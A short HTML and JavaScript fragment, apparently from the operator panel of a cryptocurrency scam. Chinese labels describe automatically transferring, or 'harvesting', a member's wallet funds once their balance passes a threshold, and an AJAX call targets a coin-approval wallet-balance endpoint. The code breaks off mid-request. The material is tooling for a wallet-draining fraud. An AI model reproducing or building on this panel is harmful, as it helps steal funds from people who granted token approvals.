        ...
        <div class="modal-content">
            ...
            <div class="modal-body form-horizontal" >
                ...
                <div class="form-group">
                    ...
                    <label style="margin-left: 100px;color: red"> 5. 监听会员预划转余额 大于此设置金额时, 系统则会先划转，收割此会员 !!!</label><br>
                    <label style="margin-left: 100px;color: red"> 6. 此功能非 100 % 监控的到! 也会由于网络等原因监控不到 !!!</label><br>
                </div>
                <div class="hr-line-dashed"></div>
...
<script>
    ...
    function updateWalletBalance() {
        ...
        $.ajax({
            url: '/alibaba888/Liv2sky3soLa93vEr62/updateCoinApproveAssertWalletBalance',
            type: 'post',
            dataType: 'json',
            data: {
                id:id,
